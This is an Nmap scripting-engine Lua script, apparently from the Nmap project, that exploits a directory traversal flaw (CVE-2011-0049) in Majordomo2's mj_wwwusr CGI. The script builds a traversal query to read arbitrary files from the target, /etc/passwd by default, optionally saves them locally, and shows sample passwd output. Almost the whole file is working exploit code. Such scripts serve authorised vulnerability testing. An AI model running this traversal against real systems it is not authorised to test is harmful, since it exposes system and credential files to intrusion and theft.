local http = require "http"
local io = require "io"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"

description = [[
Exploits a directory traversal vulnerability existing in Majordomo2 to retrieve remote files. (CVE-2011-0049).

Vulnerability originally discovered by Michael Brooks.

For more information about this vulnerability:
* http://www.mj2.org/
* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0049
* http://www.exploit-db.com/exploits/16103/
]]

---
-- @usage
-- nmap -p80 --script http-majordomo2-dir-traversal <host/ip>
--
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http    syn-ack
-- | http-majordomo2-dir-traversal: /etc/passwd was found:
-- |
-- | root:x:0:0:root:/root:/bin/bash
-- | bin:x:1:1:bin:/bin:/sbin/nologin
-- |
--
-- @args http-majordomo2-dir-traversal.rfile Remote file to download. Default: /etc/passwd
-- @args http-majordomo2-dir-traversal.uri URI Path to mj_wwwusr. Default: /cgi-bin/mj_wwwusr
-- @args http-majordomo2-dir-traversal.outfile If set it saves the remote file to this location.
--
-- Other arguments you might want to use with this script:
-- * http.useragent - Sets user agent
--

author = "Paulino Calderon <calderon@websec.mx>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive", "vuln", "exploit"}


portrule = shortport.http

local MAJORDOMO2_EXPLOIT_QRY = "?passw=&list=GLOBAL&user=&func=help&extra=/../../../../../../../.."
local MAJORDOMO2_EXPLOIT_URI = "/cgi-bin/mj_wwwusr"
local DEFAULT_REMOTE_FILE = "/etc/passwd"

---
--Writes string to file
--Taken from: hostmap.nse
local function write_file(filename, contents)
  local f, err = io.open(filename, "w")
  if not f then
    return f, err
  end
  f:write(contents)
  f:close()
  return true
end

---
-- MAIN
---
action = function(host, port)
  local response, rfile, rpath, uri, evil_uri, rfile_content, filewrite
  local output_lines = {}

  filewrite = stdnse.get_script_args("http-majordomo2-dir-traversal.outfile")
  uri = stdnse.get_script_args("http-majordomo2-dir-traversal.uri") or MAJORDOMO2_EXPLOIT_URI
  rfile = stdnse.get_script_args("http-majordomo2-dir-traversal.rfile") or DEFAULT_REMOTE_FILE
  evil_uri = uri..MAJORDOMO2_EXPLOIT_QRY..rfile

  stdnse.debug1("HTTP GET %s%s", stdnse.get_hostname(host), evil_uri)
  response = http.get(host, port, evil_uri)
  if response.body and response.status==200 then
    if response.body:match("unknowntopic") then
      stdnse.debug1("[Error] The server is not vulnerable, '%s' was not found or the web server has insufficient permissions to read it", rfile)
      return
    end
    local _
    _, _, rfile_content = string.find(response.body, '<pre>(.*)<!%-%- Majordomo help_foot format file %-%->')
    output_lines[#output_lines+1] = rfile.." was found:\n"..rfile_content
    if filewrite then
      local status, err = write_file(filewrite,  rfile_content)
      if status then
        output_lines[#output_lines+1] = string.format("%s saved to %s\n", rfile, filewrite)
      else
        output_lines[#output_lines+1] = string.format("Error saving %s to %s: %s\n", rfile, filewrite, err)
      end
    end
    return table.concat(output_lines, "\n")
  end
end
